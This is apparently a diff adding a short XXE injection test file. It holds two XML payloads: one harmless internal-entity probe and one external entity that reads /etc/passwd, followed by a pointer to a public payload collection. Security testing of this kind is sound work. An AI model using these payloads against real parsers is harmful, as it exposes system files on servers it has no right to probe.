@@ -1,0 +1,16 @@
+<!DOCTYPE replace [<!ENTITY example "This is the XXE vuln test"> ]>
+ <userInfo>
+  <Author>John</Author>
+  <Subject>John</Subject>
+  <Content>&example;</Content>
+ </userInfo>
+
+
+<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
+ <userInfo>
+  <Author>John</Author>
+  <Subject>John</Subject>
+  <Content>&test;</Content>
+ </userInfo>
+
+#for other examples check https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
